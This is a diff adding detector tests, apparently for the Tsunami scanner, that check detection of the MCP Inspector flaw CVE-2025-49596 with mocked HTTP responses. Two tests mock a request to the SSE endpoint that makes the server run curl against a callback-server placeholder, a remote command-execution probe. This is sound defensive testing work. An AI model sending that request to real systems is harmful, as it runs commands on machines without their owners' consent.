@@ -1,0 +1,82 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "MCP_Inspector_CVE_2025_49596"
+}
+
+tests: {
+  name: "whenVulnerable_returnsTrue"
+  expect_vulnerability: true
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: true
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 404
+        headers: [
+          { name: "Access-Control-Expose-Headers" value: "mcp-session-id" }
+        ]
+        body_content: "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /</pre>\n</body>\n</html>\n"
+      },
+      {
+        uri: "/sse?transportType=stdio&command=curl&args={{ T_CBS_URI }}"
+        status: 200
+        body_content: "event: endpoint\ndata: /message?sessionId=c868d434-b75d-49cb-9f91-ca9d2c86e518"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNoCallback_returnsFalse"
+  expect_vulnerability: false
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: false
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 404
+        headers: [
+          { name: "Access-Control-Expose-Headers" value: "mcp-session-id" }
+        ]
+        body_content: "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /</pre>\n</body>\n</html>\n"
+      },
+      {
+        uri: "/sse?transportType=stdio&command=curl&args={{ T_CBS_URI }}"
+        status: 401
+        body_content: "{\"error\":\"Unauthorized\",\"message\":\"Authentication required. Use the session token shown in the console when starting the server.\"}"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNotMCP_Inspector_returnsFalse"
+  expect_vulnerability: false
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: true
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 200
+        body_content: "Hello world"
+      }
+    ]
+  }
+}
